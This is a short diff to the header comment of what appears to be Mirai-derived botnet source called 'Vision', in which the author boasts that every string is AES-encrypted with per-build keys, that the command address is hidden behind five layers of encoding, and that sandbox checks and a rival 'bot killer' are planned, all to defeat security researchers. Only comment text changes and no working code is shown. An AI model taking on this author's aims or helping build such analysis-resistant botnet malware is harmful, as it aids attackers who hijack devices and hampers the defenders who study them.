@@ -9,7 +9,7 @@
 // ⠀⠀⠀⠀⠀⠀⠰⠆⠁⠀⢈⠉⠹⣹⠈⠁⠀⠆⢰⢆⢀⣾⣾⠉⠀⠀⠀⠀⠀⠀
 // ⠀⠀⠀⠀⠀⠀⠀⠀⠃⠷⠀⠄⣤⡀⠀⣠⠠⣤⠄⠼⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀
 // ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-//   WIP/INCOMING FEATURES: Mirai/Bot Killer, Nanosecond Sandbox Check, Complete Random XOR/AES Keys Per Build; 
+//   WIP/INCOMING FEATURES: Mirai/Bot Killer, Nanosecond Sandbox Check;
 // ============================================================================
 //
 //  For months I pulled apart dozens of Mirai variants line by line. I read every Xlabs
@@ -17,7 +17,7 @@
 //  address decrypted in a hour by some random blog writer claiming to be a "researcer".
 //  We can do so much better. That's why I built Vision to survive anaylsis. 
 //
-//  Every string in this binary is encrypted. AES-128-CTR. Zero plaintext.
+//  Every string in this binary is encrypted. Unique Per-Build AES-128-CTR Keys. Zero plaintext.
 //  You throw it in strings? You get nothing. The address resolution alone is five layers deep — Base64 into XOR
 //  into RC4 into substitution into MD5 verification back through AES. 
 //
